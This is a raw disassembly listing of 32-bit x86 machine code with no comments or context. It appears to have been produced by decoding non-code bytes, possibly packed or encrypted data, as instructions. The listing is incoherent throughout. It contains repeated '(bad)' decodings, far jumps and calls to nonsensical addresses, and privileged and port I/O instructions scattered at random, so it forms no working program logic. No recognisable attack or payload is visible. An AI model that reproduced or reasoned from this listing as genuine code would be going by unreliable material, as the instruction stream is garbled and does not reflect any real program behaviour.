  417677:	mov    ebx,ebp
  417679:	cmc    
  41767a:	addr16 cli 
  41767c:	add    DWORD PTR [ecx+eax*1-0x40],ebp
  417680:	cmp    ebx,DWORD PTR [ebx-0x27894cd6]
  417686:	cld    
  417687:	cwde   
  417688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417689:	jmp    0x1932:0x12f5fefd
  417690:	xor    al,0x13
  417692:	das    
  417693:	ins    BYTE PTR es:[edi],dx
  417694:	stc    
  417695:	aas    
  417696:	ins    BYTE PTR es:[edi],dx
  417697:	push   0xaed0a0d5
  41769c:	xchg   edi,eax
  41769d:	mov    BYTE PTR cs:[eax],dl
  4176a0:	cmp    ebp,ebx
  4176a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176a3:	popf   
  4176a4:	adc    DWORD PTR [edx+0x25],eax
  4176a7:	mov    WORD PTR [edi+0x19b5600e],?
  4176ad:	shl    DWORD PTR [edi],1
  4176af:	aam    0xef
  4176b1:	fs dec edx
  4176b3:	lods   eax,DWORD PTR ds:[esi]
  4176b4:	jb     0x4176d8
  4176b6:	sbb    al,0x8a
  4176b8:	mov    dl,0x5d
  4176ba:	adc    BYTE PTR [edi+0x752935ee],al
  4176c0:	enter  0x3dea,0x9b
  4176c4:	fisttp WORD PTR [esi]
  4176c6:	xor    al,ch
  4176c8:	sub    BYTE PTR [ecx-0x1c592b90],al
  4176ce:	mov    ds:0xbf57a82e,al
  4176d3:	xor    al,0x21
  4176d5:	ret    
  4176d6:	loopne 0x417695
  4176d8:	adc    al,0x31
  4176da:	dec    esp
  4176db:	push   edx
  4176dc:	iret   
  4176dd:	loop   0x4176d7
  4176df:	ret    0x2c38
  4176e2:	arpl   di,di
  4176e4:	inc    ebx
  4176e5:	sbb    eax,0xfc0224d3
  4176ea:	or     eax,0xf4dccf37
  4176ef:	dec    esp
  4176f0:	and    BYTE PTR [edi-0x14],ah
  4176f3:	(bad)  
  4176f5:	test   BYTE PTR [edi-0xdb7e3c8],0x66
  4176fc:	out    dx,eax
  4176fd:	xchg   DWORD PTR [ebx+0x4977805c],ecx
  417703:	test   eax,0x67f1e395
  417708:	jmp    0x5fd9433a
  41770d:	mov    DWORD PTR [ebx],edi
  41770f:	xchg   esp,eax
  417710:	call   0xd6ea0f3f
  417715:	adc    eax,0xd84653f5
  41771a:	sbb    al,0xc3
  41771c:	adc    DWORD PTR [eax-0x7f],ebp
  41771f:	mov    esi,0x7ab9312c
  417724:	rcl    DWORD PTR [edx+0x75],0x4e
  417728:	adc    edi,DWORD PTR [ecx+eax*4]
  41772b:	dec    ebp
  41772c:	sub    bl,BYTE PTR [edi+0x4d34e967]
  417732:	inc    esi
  417733:	add    eax,0xa763bca5
  417738:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417739:	adc    eax,0x50a9f503
  41773e:	xchg   BYTE PTR [ebx+0x31],ah
  417741:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417742:	jmp    0x3c9e49d3
  417747:	push   edi
  417748:	xchg   BYTE PTR [ecx-0x2d],cl
  41774b:	cmp    dh,BYTE PTR [edx-0x11bf5d46]
  417751:	enter  0xf338,0x89
  417755:	jo     0x41777d
  417757:	call   FWORD PTR [ebx]
  417759:	sbb    DWORD PTR ss:[eax-0x554eb034],0x222debfe
  417764:	xchg   esi,eax
  417765:	and    eax,0x872dee17
  41776a:	xchg   BYTE PTR [esi-0x62c39112],ch
  417770:	lock add esp,DWORD PTR [edx]
  417773:	push   ecx
  417774:	xor    eax,0xa3418a22
  417779:	sub    BYTE PTR [edi+0x2d],bl
  41777c:	les    edx,FWORD PTR [esi]
  41777e:	aaa    
  41777f:	inc    esi
  417780:	in     al,dx
  417781:	call   0x638d:0x5b059a9a
  417788:	dec    esp
  417789:	dec    edx
  41778a:	int3   
  41778b:	lods   al,BYTE PTR ds:[esi]
  41778c:	add    dl,BYTE PTR [ebx-0x52]
  41778f:	clc    
  417790:	inc    edi
  417791:	sbb    al,0xc2
  417793:	cmc    
  417794:	push   eax
  417795:	jo     0x4177e7
  417797:	jmp    0xb636928f
  41779c:	mov    edi,0x5e4cf6e2
  4177a1:	idiv   BYTE PTR [edx-0x28]
  4177a4:	add    al,bl
  4177a6:	cmp    al,0x2e
  4177a8:	jge    0x4177a9
  4177aa:	xchg   edx,eax
  4177ab:	(bad)  [edx+0xd]
  4177ae:	pop    ebp
  4177af:	loopne 0x41782d
  4177b1:	pusha  
  4177b2:	xchg   esp,ecx
  4177b4:	push   cs
  4177b5:	and    DWORD PTR [edx],ebx
  4177b7:	das    
  4177b8:	push   ebx
  4177b9:	dec    esi
  4177ba:	or     al,0xca
  4177bc:	cli    
  4177bd:	or     bl,BYTE PTR [eax+0x78]
  4177c0:	test   al,0x9c
  4177c2:	les    ecx,FWORD PTR [esp+ecx*1+0x23]
  4177c6:	shr    DWORD PTR [ecx+0x68d81122],cl
  4177cc:	add    al,0x9a
  4177ce:	inc    esi
  4177cf:	cmp    al,0x60
  4177d1:	sub    eax,0xadf332d1
  4177d6:	popf   
  4177d7:	mov    ecx,0xf7509e4f
  4177dc:	scas   eax,DWORD PTR es:[edi]
  4177dd:	xchg   edi,eax
  4177de:	xchg   ecx,eax
  4177df:	mov    al,ds:0xefe58ccc
  4177e4:	pusha  
  4177e5:	call   0x845787c7
  4177ea:	ins    BYTE PTR es:[edi],dx
  4177eb:	(bad)  
  4177ec:	push   eax
  4177ed:	cwde   
  4177ee:	rcl    dh,0x53
  4177f1:	daa    
  4177f2:	add    DWORD PTR [esi],eax
  4177f4:	add    BYTE PTR [ecx+ebx*1-0x19],0xc9
  4177f9:	inc    ebx
  4177fa:	les    ecx,FWORD PTR ds:0x49ac85a9
  417800:	loop   0x417832
  417802:	faddp  st(3),st
  417804:	je     0x4177c9
  417806:	in     al,dx
  417807:	cwde   
  417808:	data16 mov WORD PTR [ebx-0x37],es
  41780c:	ret    
  41780d:	xchg   ebx,eax
  41780e:	gs loop 0x417874
  417811:	xor    ebx,DWORD PTR [ecx+0x17]
  417814:	int    0xce
  417816:	int3   
  417817:	fadd   DWORD PTR [edx+0x4e]
  41781a:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41781c:	sbb    DWORD PTR [eax+0x5ef02358],0xffffffff
  417823:	mov    BYTE PTR cs:[ebx+esi*2],dl
  417827:	cmp    esp,edx
  417829:	rcl    DWORD PTR [edx],cl
  41782b:	push   esi
  41782c:	es mov edx,0x53a8321
  417832:	addr16 push es
  417834:	xor    BYTE PTR [eax],0x83
  417837:	mov    DWORD PTR [edi],ecx
  417839:	retf   0xfa47
  41783c:	xor    edx,0x9ceba342
  417842:	iret   
  417843:	dec    edi
  417844:	sub    al,0x91
  417846:	sbb    al,0x2b
  417848:	(bad)  [edx]
  41784a:	(bad)  
  41784b:	int3   
  41784c:	pop    edx
  41784d:	retf   0x8abd
  417850:	pop    DWORD PTR [esi-0x1bf5b59a]
  417856:	fdivr  DWORD PTR [ebp+0x30]
  417859:	inc    ebx
  41785a:	mov    bh,0x19
  41785c:	jo     0x417896
  41785e:	(bad)  
  41785f:	sti    
  417860:	in     eax,0x47
  417862:	ret    
  417863:	push   edi
  417864:	ja     0x4177e7
  417866:	push   es
  417867:	scas   eax,DWORD PTR es:[edi]
  417868:	mov    esi,0x451fdcb3
  41786d:	xlat   BYTE PTR ds:[ebx]
  41786e:	push   ecx
  41786f:	sbb    dl,dl
  417871:	pop    edi
  417872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417873:	adc    esp,DWORD PTR [eax-0x41]
  417876:	fist   WORD PTR [ecx]
  417878:	pop    eax
  417879:	imul   edi,DWORD PTR [edi],0x68
  41787c:	mov    WORD PTR [edx-0x10842e2d],es
  417882:	test   BYTE PTR [esi+0x3d],0xbe
  417886:	dec    edi
  417887:	ja     0x4178c4
  417889:	xor    DWORD PTR [ecx],esi
  41788b:	ret    0x123f
  41788e:	adc    dl,BYTE PTR [eax+0x5e6050ac]
  417894:	ss push esi
  417896:	pop    ds
  417897:	inc    edi
  417898:	dec    ecx
  417899:	data16 cmp BYTE PTR [ebx-0x64],0x39
  41789e:	xchg   BYTE PTR [edi+0x48648137],dh
  4178a4:	cmp    al,0xda
  4178a6:	mov    WORD PTR [esi],es
  4178a8:	cmp    DWORD PTR [edi+0x566ad7be],ebp
  4178ae:	das    
  4178af:	sbb    al,0x8f
  4178b1:	pop    es
  4178b2:	test   BYTE PTR [eax],cl
  4178b4:	push   es
  4178b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178b6:	ss mov edx,0x69cad3a6
  4178bc:	repnz repnz int 0xac
  4178c0:	retf   
  4178c1:	sbb    al,0x5d
  4178c3:	xchg   esi,eax
  4178c4:	or     ebx,ebx
  4178c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178c7:	ins    DWORD PTR es:[edi],dx
  4178c8:	std    
  4178c9:	push   es
  4178ca:	mov    al,0xea
  4178cc:	popa   
  4178cd:	adc    al,0x5e
  4178cf:	neg    BYTE PTR [edx+0x50]
  4178d2:	aaa    
  4178d3:	(bad)  
  4178d4:	dec    esi
  4178d5:	mov    al,0x1d
  4178d7:	sar    DWORD PTR [edi+0x3f],cl
  4178da:	lods   al,BYTE PTR ds:[esi]
  4178db:	sbb    ch,bh
  4178dd:	adc    eax,0x9bb3ac32
  4178e2:	jno    0x417941
  4178e4:	inc    eax
  4178e5:	xor    al,0x44
  4178e7:	aam    0x1e
  4178e9:	push   ss
  4178ea:	leave  
  4178eb:	inc    eax
  4178ec:	cmp    eax,0xf795460a
  4178f1:	loope  0x417901
  4178f3:	aas    
  4178f4:	push   edi
  4178f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178f6:	rcr    DWORD PTR [ebx+0x50c7ecb5],1
  4178fc:	cmp    DWORD PTR [ebp-0x68],0xffffffb1
  417900:	icebp  
  417901:	daa    
  417902:	xchg   edx,eax
  417903:	je     0x41788d
  417905:	push   eax
  417906:	inc    esi
  417907:	stos   DWORD PTR es:[edi],eax
  417908:	mov    cl,0x19
  41790a:	dec    ecx
  41790b:	outs   dx,DWORD PTR ds:[esi]
  41790c:	fucomip st,st(1)
  41790e:	jp     0x4178ad
  417910:	(bad)  
  417911:	dec    esi
  417912:	idiv   DWORD PTR [edx+ebx*8-0x5c]
  417916:	dec    DWORD PTR [eax-0x36]
  417919:	sbb    bh,BYTE PTR [edi+ebp*8-0x359c6a96]
  417920:	int    0x3
  417922:	pop    ds
  417923:	nop
  417924:	jb     0x41796c
  417926:	test   DWORD PTR [ebp+0x7e0d6970],ecx
  41792c:	pop    esp
  41792d:	mov    ebx,ecx
  41792f:	sub    eax,0x563c5b56
  417934:	les    eax,FWORD PTR [edx-0x63]
  417937:	cmc    
  417938:	xchg   edi,eax
  417939:	mov    edx,0x90cbd28b
  41793e:	cdq    
  41793f:	xlat   BYTE PTR ds:[ebx]
  417940:	jno    0x4178f4
  417942:	mov    edi,0x1f5ab817
  417947:	fstp   QWORD PTR [esi]
  417949:	repz pop es
  41794b:	daa    
  41794c:	jecxz  0x4178f5
  41794e:	lahf   
  41794f:	xchg   ebp,eax
  417950:	call   0x559f56d7
  417955:	fcom   DWORD PTR [ecx-0x2e05734e]
  41795b:	ret    
  41795c:	and    BYTE PTR [esi-0x38df9cc0],ch
  417962:	inc    edi
  417963:	inc    ebx
  417964:	or     al,0x70
  417966:	pop    ebp
  417967:	mov    ch,0xdd
  417969:	sub    BYTE PTR [ebp-0x54ddaa74],ah
  41796f:	int3   
  417970:	adc    al,0xc6
  417972:	or     eax,0xfe982b60
  417977:	xor    ebp,esp
  417979:	push   ss
  41797a:	pop    ebx
  41797b:	shl    dl,cl
  41797d:	sub    DWORD PTR [ebx+0x40],eax
  417980:	aaa    
  417981:	push   ebp
  417982:	out    0x8c,eax
  417984:	mov    edx,0xb684595f
  417989:	(bad)  
  41798a:	pop    ebp
  41798b:	or     BYTE PTR [edx+0x2b],cl
  41798e:	mov    eax,ds:0x3463d561
  417993:	jecxz  0x4179eb
  417995:	cld    
  417996:	jb     0x4179b8
  417998:	repnz daa 
  41799a:	aas    
  41799b:	cwde   
  41799c:	shl    BYTE PTR [eax-0x1a],1
  41799f:	in     eax,dx
  4179a0:	push   ss
  4179a1:	add    bh,dh
  4179a3:	or     BYTE PTR gs:[ebx+0x2d6e63e1],ah
  4179aa:	mov    al,ds:0xb0b164e4
  4179af:	ds aas 
  4179b1:	outs   dx,DWORD PTR ds:[esi]
  4179b2:	inc    edi
  4179b3:	pmaxsw mm7,mm6
  4179b6:	xor    eax,0xf3c67ffe
  4179bb:	out    0xbb,eax
  4179bd:	sti    
  4179be:	test   DWORD PTR [ecx+0x736ed5d5],edi
  4179c4:	fiadd  DWORD PTR [ebx-0x12]
  4179c7:	inc    eax
  4179c8:	arpl   di,di
  4179ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179cb:	pop    ecx
  4179cc:	gs nop
  4179ce:	sub    al,0x95
  4179d0:	retf   
  4179d1:	mov    dl,0xaa
  4179d3:	sti    
  4179d4:	out    dx,eax
  4179d5:	loope  0x417a2f
  4179d7:	dec    eax
  4179d8:	xchg   DWORD PTR [ebp+ecx*2+0x170e0d29],esp
  4179df:	je     0x41798a
  4179e1:	inc    edi
  4179e2:	sub    eax,0x1cfc036c
  4179e7:	pop    es
  4179e8:	loop   0x41797c
  4179ea:	cmp    edx,DWORD PTR [edi]
  4179ec:	cdq    
  4179ed:	jne    0x4179a1
  4179ef:	jge    0x417a62
  4179f1:	dec    ebx
  4179f2:	outs   dx,BYTE PTR ds:[esi]
  4179f3:	lea    esp,[esi+0x27]
  4179f6:	ds call 0x54b2:0x477bbd6b
  4179fe:	adc    ch,BYTE PTR [ebp*8-0x16eb0fb]
  417a05:	js     0x417a5a
  417a07:	push   0x1d
  417a09:	call   edx
  417a0b:	and    al,0xce
  417a0d:	jp     0x417a81
  417a0f:	(bad)  
  417a10:	ins    DWORD PTR es:[edi],dx
  417a11:	cs sub al,0x2f
  417a14:	mov    cl,0x8d
  417a16:	leave  
  417a17:	loopne 0x417a2a
  417a19:	popf   
  417a1a:	lea    edx,[ebx]
  417a1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a1d:	jmp    0xd08b:0x98a52c52
  417a24:	jl     0x417a23
  417a26:	cmp    BYTE PTR [eax],bh
  417a28:	outs   dx,BYTE PTR ds:[esi]
  417a29:	adc    ebx,DWORD PTR [esi+0x2e744b59]
  417a2f:	dec    ebx
  417a30:	repz bound esp,QWORD PTR [ecx+0x7a]
  417a34:	cmp    eax,DWORD PTR [edi+esi*1+0x23]
  417a38:	jnp    0x417a76
  417a3a:	jmp    0x850d:0xf00da96a
  417a41:	test   BYTE PTR [ebp+0x33],0x4f
  417a45:	inc    eax
  417a47:	or     eax,0x27e5e758
  417a4c:	leave  
  417a4d:	jg     0x417a54
  417a4f:	inc    edx
  417a50:	nop
  417a51:	jecxz  0x417a31
  417a53:	dec    eax
  417a54:	int3   
  417a55:	into   
  417a56:	arpl   bx,cx
  417a58:	pop    ds
  417a59:	or     eax,0x95bc9aa0
  417a5e:	out    0xb3,al
  417a60:	ss push esp
  417a62:	or     ebx,esp
  417a64:	mov    BYTE PTR [ecx-0x31471ae9],dl
  417a6a:	mov    WORD PTR [ecx+0x7a6d75a],gs
  417a70:	out    dx,al
  417a71:	xor    eax,0x9f2434c8
  417a76:	add    ecx,DWORD PTR [ebp+ecx*1-0x66]
  417a7a:	jae    0x417af2
  417a7c:	mov    dl,0x6
  417a7e:	mov    bh,0x88
  417a80:	lock cmp eax,0x95a53bc7
  417a86:	inc    esi
  417a87:	fldcw  WORD PTR [eax+0x0]
  417a8a:	or     ecx,DWORD PTR cs:[esi+0x739e323e]
  417a91:	xchg   edi,eax
  417a92:	add    esi,DWORD PTR [edi+edi*1-0x7f]
  417a96:	xchg   esp,eax
  417a97:	(bad)  
  417a99:	push   ss
  417a9a:	in     eax,0xce
  417a9c:	ds fs xchg ecx,eax
  417a9f:	daa    
  417aa0:	mov    ah,0x21
  417aa2:	pop    eax
  417aa3:	(bad)  
  417aa4:	out    dx,eax
  417aa5:	xor    BYTE PTR [ebp+0x51f602bd],bl
  417aab:	ret    0xc4f0
  417aae:	pop    ebp
  417aaf:	pop    esi
  417ab0:	retf   
  417ab1:	jmp    0xc125:0xedeff163
  417ab8:	std    
  417ab9:	sub    eax,0x21633909
  417abe:	popf   
  417abf:	repnz cmp cl,BYTE PTR [ecx+0x5f023154]
  417ac6:	xchg   DWORD PTR [edi-0xb],ecx
  417ac9:	repz fist DWORD PTR [eax+0x3]
  417acd:	sbb    ah,ah
  417acf:	cmp    al,0x9d
  417ad1:	adc    bh,dl
  417ad3:	or     BYTE PTR [ebp+0x38a60c8a],0xc0
  417ada:	pushf  
  417adb:	out    0x8f,eax
  417add:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ade:	jb     0x417b00
  417ae0:	rol    DWORD PTR [eax+ebx*1],cl
  417ae3:	js     0x417b1e
  417ae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ae6:	and    ecx,eax
  417ae8:	js     0x417ae1
  417aea:	popf   
  417aeb:	mov    ds:0x51020e37,al
  417af0:	bound  ebp,QWORD PTR [esi]
  417af2:	fmul   QWORD PTR gs:[ecx-0x37dcce8e]
  417af9:	cwde   
  417afa:	call   0xb579:0x64656f49
  417b01:	in     al,0x54
  417b03:	and    al,0x6e
  417b05:	lock adc eax,0x78d6a444
  417b0b:	lea    esp,[esi+0x34]
  417b0e:	pop    ebp
  417b0f:	lds    esi,FWORD PTR [esi-0x70]
  417b12:	sbb    ebp,DWORD PTR [edi+0x66]
  417b15:	inc    ebx
  417b16:	and    al,0xbb
  417b18:	jns    0x417b2b
  417b1a:	pop    esp
  417b1b:	std    
  417b1c:	push   esp
  417b1d:	mov    al,ds:0xd0e01737
  417b22:	cmp    al,0xbc
  417b24:	cmp    eax,0xb679bb9b
  417b29:	les    ecx,FWORD PTR [ecx]
  417b2b:	aas    
  417b2c:	out    dx,al
  417b2d:	mov    bh,0x97
  417b2f:	add    eax,0x5023742d
  417b34:	inc    ebx
  417b35:	dec    ecx
  417b36:	fmul   QWORD PTR [ebp-0x63]
  417b39:	xchg   edx,eax
  417b3a:	ror    BYTE PTR [edi+0x69],1
  417b3d:	xchg   esi,eax
  417b3e:	pop    edx
  417b3f:	pop    es
  417b40:	add    esi,DWORD PTR [ebp+0x1854721]
  417b46:	dec    ebp
  417b47:	pop    es
  417b48:	lock and al,0x8c
  417b4b:	into   
  417b4c:	fsubr  QWORD PTR [edx+edx*8-0x50]
  417b50:	jg     0x417bc9
  417b52:	sbb    ebp,DWORD PTR [esi+eax*8-0xd]
  417b56:	dec    ecx
  417b57:	js     0x417b32
  417b59:	mov    dl,0x1b
  417b5b:	loope  0x417b0f
  417b5d:	add    BYTE PTR [ebx+ebp*1+0x1777c71d],ch
  417b64:	mov    dl,0xe6
  417b66:	arpl   WORD PTR [eax+0x64caff58],bp
  417b6c:	out    0xf4,eax
  417b6e:	xchg   esp,eax
  417b6f:	push   0x4b63409b
  417b74:	jp     0x417b91
  417b76:	pop    edx
  417b77:	mov    esp,0xef3d35ee
  417b7c:	push   es
  417b7d:	adc    DWORD PTR [ebx],eax
  417b7f:	stc    
  417b80:	jae    0x417b80
  417b82:	out    0xad,al
  417b84:	out    dx,eax
  417b85:	xchg   ebx,eax
  417b86:	push   esp
  417b87:	ja     0x417bcb
  417b89:	mov    ecx,0xa8bf5911
  417b8e:	les    esi,FWORD PTR [ebx+esi*1]
  417b91:	cmc    
  417b92:	ds scas eax,DWORD PTR es:[edi]
  417b94:	test   BYTE PTR [ebx],cl
  417b96:	and    DWORD PTR [ebp+0x3c],edi
  417b99:	in     eax,0x8f
  417b9b:	inc    eax
  417b9c:	enter  0xcb84,0x98
  417ba0:	and    eax,0x191144de
  417ba5:	nop
  417ba6:	sbb    ah,bl
  417ba8:	shl    BYTE PTR [ebx-0x1e],1
  417bab:	xor    BYTE PTR [eax-0x2c48d5d4],cl
  417bb1:	lock rol bh,cl
  417bb4:	hlt    
  417bb5:	ja     0x417c02
  417bb7:	mov    eax,ds:0xee43ddbc
  417bbc:	dec    edx
  417bbd:	loopne 0x417bc1
  417bbf:	sub    ebp,DWORD PTR [ecx+eiz*1]
  417bc2:	dec    eax
  417bc3:	cmp    esi,DWORD PTR [edi+edi*2]
  417bc6:	xchg   eax,eax
  417bc8:	sbb    edi,DWORD PTR [ebp-0x5e]
  417bcb:	mov    eax,ds:0xf4598767
  417bd0:	mov    DWORD PTR [edi-0x4c32f11c],ebp
  417bd6:	xlat   BYTE PTR ds:[ebx]
  417bd7:	cmc    
  417bd8:	retf   0x2001
  417bdb:	retf   0x5942
  417bde:	leave  
  417bdf:	jae    0x417bb9
  417be1:	dec    ecx
  417be2:	pushf  
  417be3:	or     BYTE PTR [ebx+eiz*1],ah
  417be6:	jae    0x417c36
  417be8:	sub    BYTE PTR [eax-0x652ce1f4],al
  417bee:	push   esi
  417bef:	fwait
  417bf0:	sub    edi,edi
  417bf2:	mov    DWORD PTR [edi-0x49ba7e7f],ebx
  417bf8:	call   0x145a:0xbda56e38
  417bff:	dec    ecx
  417c00:	fwait
  417c01:	lahf   
  417c02:	mov    ch,0xe9
  417c04:	out    0x98,al
  417c06:	mov    edx,0xc11aed34
  417c0b:	sbb    esp,edi
  417c0d:	adc    DWORD PTR [ebx],edi
  417c0f:	or     edx,edi
  417c11:	nop
  417c12:	sbb    eax,0x51481af7
  417c17:	or     al,0xc9
  417c19:	icebp  
  417c1a:	call   0xe345a15a
  417c1f:	cmp    al,dl
  417c21:	in     al,0x22
  417c23:	push   cs
  417c24:	daa    
  417c25:	leave  
  417c26:	xchg   esp,eax
  417c27:	mov    ds:0xee070122,eax
  417c2c:	sub    BYTE PTR ds:0x66b9c916,bh
  417c32:	or     dh,BYTE PTR [edx-0x520ee058]
  417c38:	xchg   edi,eax
  417c39:	repz mov bl,0x23
  417c3c:	outs   dx,DWORD PTR ds:[esi]
  417c3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c3e:	jp     0x417c35
  417c40:	and    cl,BYTE PTR [eax+0x2e]
  417c43:	add    ah,ah
  417c45:	call   0xcbd7:0xae011a7a
  417c4c:	ror    DWORD PTR [ecx],0x84
  417c4f:	xor    eax,0x5ebe5237
  417c54:	add    DWORD PTR [ebx-0x2107b355],esp
  417c5a:	or     ebx,edx
  417c5c:	out    0xa0,al
  417c5e:	popa   
  417c5f:	fst    st(3)
  417c61:	xor    DWORD PTR [edi+0x12f604fe],esi
  417c67:	or     al,0x2e
  417c69:	int3   
  417c6a:	aam    0x8b
  417c6c:	cs test eax,0xeb9cf9d2
  417c72:	pop    edi
  417c73:	jp     0x417c33
  417c75:	popa   
  417c76:	mov    dl,0x65
  417c78:	stos   DWORD PTR es:[edi],eax
  417c79:	xor    edx,DWORD PTR [edx-0x17f4ca0c]
  417c7f:	add    DWORD PTR [ebx],0x2067334f
  417c85:	stos   DWORD PTR es:[edi],eax
  417c86:	inc    edx
  417c87:	cs inc edi
  417c89:	lods   eax,DWORD PTR ds:[esi]
  417c8a:	or     BYTE PTR [esi],bh
  417c8c:	xor    BYTE PTR [edi+0x49cdc350],al
  417c92:	sahf   
  417c93:	mov    dl,0xe2
  417c95:	mov    al,0x5f
  417c97:	test   DWORD PTR [ebx+ebp*1+0x3c962dbd],edx
  417c9e:	fild   WORD PTR [ecx-0x4ad91f50]
  417ca4:	aad    0xf8
  417ca6:	ret    
  417ca7:	je     0x417cf7
  417ca9:	push   esi
  417caa:	ins    BYTE PTR es:[edi],dx
  417cab:	dec    ebp
  417cac:	ret    
  417cad:	outs   dx,DWORD PTR ds:[esi]
  417cae:	cmp    BYTE PTR [ecx-0x73],dh
  417cb1:	sbb    bl,dh
  417cb3:	adc    eax,0xe4381a7f
  417cb8:	sbb    ah,BYTE PTR [ecx-0x27fbd3a4]
  417cbe:	into   
  417cbf:	outs   dx,DWORD PTR ds:[esi]
  417cc0:	int3   
  417cc1:	mov    ecx,0x8e3431fa
  417cc6:	xchg   ebx,eax
  417cc7:	add    DWORD PTR [ebx+ecx*1-0x6],ecx
  417ccb:	mov    ah,BYTE PTR [eax]
  417ccd:	pusha  
  417cce:	xor    edx,eax
  417cd0:	jo     0x417cd3
  417cd2:	pop    ebx
  417cd3:	into   
  417cd4:	jb     0x417d33
  417cd6:	mov    al,ds:0x7c6f19be
  417cdb:	wrmsr  
  417cdd:	mov    esi,0xc88c7f48
  417ce2:	(bad)
  417ce5:	push   ecx
  417ce6:	jmp    0xd2d54d7a
  417ceb:	test   BYTE PTR [ecx],0xa7
  417cee:	retf   0x118b
  417cf1:	jg     0x417d43
  417cf3:	mov    edi,0xa4c39130
  417cf8:	jns    0x417c94
  417cfa:	call   0x33be:0x9c1a6b2e
  417d01:	xchg   dh,cl
  417d03:	push   es
  417d04:	sub    dh,BYTE PTR [eax+edx*2]
  417d07:	add    eax,0xa3c7580a
  417d0c:	arpl   WORD PTR [ebx+ebp*4+0x3],bx
  417d10:	mov    al,0x49
  417d12:	jae    0x417cb4
  417d14:	xchg   esp,eax
  417d15:	out    dx,eax
  417d16:	mov    esi,0xfc2bd3ee
  417d1b:	cdq    
  417d1c:	adc    dl,cl
  417d1e:	rcr    BYTE PTR [edx+0x74],cl
  417d21:	jl     0x417d1d
  417d23:	push   0x800d5892
  417d28:	ja     0x417cd9
  417d2a:	aas    
  417d2b:	mov    DWORD PTR [ecx],ebp
  417d2d:	push   0xffffffee
  417d2f:	shr    BYTE PTR [ecx],1
  417d31:	push   esp
  417d32:	repnz mov ch,BYTE PTR [esp+ebx*4-0x6c]
  417d37:	imul   BYTE PTR [ecx-0x51]
  417d3a:	xor    ebx,DWORD PTR [ecx+eax*4-0x21]
  417d3e:	mov    ecx,0xff15956f
  417d43:	dec    ecx
  417d44:	mov    ebp,0x533e4ed7
  417d49:	xlat   BYTE PTR ds:[ebx]
  417d4a:	inc    edi
  417d4b:	adc    BYTE PTR [ebp+edi*1-0x12fa25b7],0x71
  417d53:	adc    al,0x63
  417d55:	pop    edx
  417d56:	mov    eax,0x57cd5ebe
  417d5b:	push   ebp
  417d5c:	mov    dh,0x30
  417d5e:	or     BYTE PTR [ecx+0x64647a1b],bl
  417d64:	xor    ah,ah
  417d66:	sbb    edx,DWORD PTR [ecx-0x6f89f57e]
  417d6c:	mov    al,ds:0x57806b70
  417d71:	mov    eax,0xad06196c
  417d76:	xor    al,0x21
  417d78:	lahf   
  417d79:	xchg   DWORD PTR [ebp+0x55],esi
  417d7c:	xor    al,0x7a
  417d7e:	jl     0x417d18
  417d80:	aam    0xff
  417d82:	or     al,0xff
  417d84:	pop    es
  417d85:	push   ebx
  417d86:	sbb    cl,BYTE PTR [ebp+0x72]
  417d89:	les    esp,FWORD PTR [ecx]
  417d8b:	sahf   
  417d8c:	push   ebp
  417d8d:	pop    ebx
  417d8e:	repnz pusha 
  417d90:	mov    ss,WORD PTR ds:0xa11189fb
  417d96:	shl    BYTE PTR [esi+0x2d],0xe5
  417d9a:	retf   
  417d9b:	pop    edx
  417d9c:	sub    al,BYTE PTR [esi+0x52]
  417d9f:	mov    cl,0xa
  417da1:	repz loope 0x417d31
  417da4:	nop    esi
  417da7:	gs js  0x417ddd
  417daa:	nop
  417dab:	pop    edi
  417dac:	pop    es
  417dad:	imul   ebp,eax,0xf
  417db0:	shl    BYTE PTR [eax-0x165531db],cl
  417db6:	push   0xc
  417db8:	int    0x8a
  417dba:	jno    0x417dc7
  417dbc:	push   cs
  417dbd:	xchg   edx,eax
  417dbe:	gs mov edi,0xbc3a6919
  417dc4:	jl     0x417d73
  417dc6:	ror    BYTE PTR [ebx-0x23601a7c],cl
  417dcc:	inc    ecx
  417dcd:	mov    cl,0xd
  417dcf:	jne    0x417e41
  417dd1:	pop    ecx
  417dd2:	and    DWORD PTR es:[edx+0x464a4c98],0xffffff90
  417dda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ddb:	call   0xd57165d3
  417de0:	lds    ecx,FWORD PTR [edi]
  417de2:	test   DWORD PTR [ebp-0x7420f6b8],edi
  417de8:	jae    0x417dfb
  417dea:	mov    ch,BYTE PTR [ebx+0x6]
  417ded:	fdiv   DWORD PTR [edi-0x2ec1740d]
  417df3:	rcl    BYTE PTR [eax],0x5a
  417df6:	shr    DWORD PTR [ecx+0x7be9b1c1],cl
  417dfc:	and    ebp,ebp
  417dfe:	pop    ds
  417dff:	sub    edx,DWORD PTR [ecx]
  417e01:	pop    ebp
  417e02:	data16 sbb BYTE PTR [eax+0x77cd1828],0x92
  417e0a:	test   eax,0xd7237239
  417e0f:	mov    DWORD PTR [ecx-0x2f],esp
  417e12:	jb     0x417e35
  417e14:	stc    
  417e15:	cs leave 
  417e17:	stc    
  417e18:	sub    DWORD PTR [esi+0x7e26ff14],ecx
  417e1e:	xor    al,0x1a
  417e20:	jae    0x417e23
  417e22:	add    al,0x72
  417e24:	(bad)  
  417e25:	and    al,0x51
  417e27:	div    BYTE PTR [ebp+0x39f0108f]
  417e2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e2e:	aad    0xeb
  417e30:	and    BYTE PTR [edi+0x4f52d685],dh
  417e36:	or     BYTE PTR [edi-0x10],0x2c
  417e3a:	fcmovnu st,st(4)
  417e3c:	sbb    WORD PTR [ebp-0x7936fc4],dx
  417e43:	xor    DWORD PTR [esi],edx
  417e45:	mov    esi,0x192af420
  417e4a:	pop    eax
  417e4b:	jmp    0x417e90
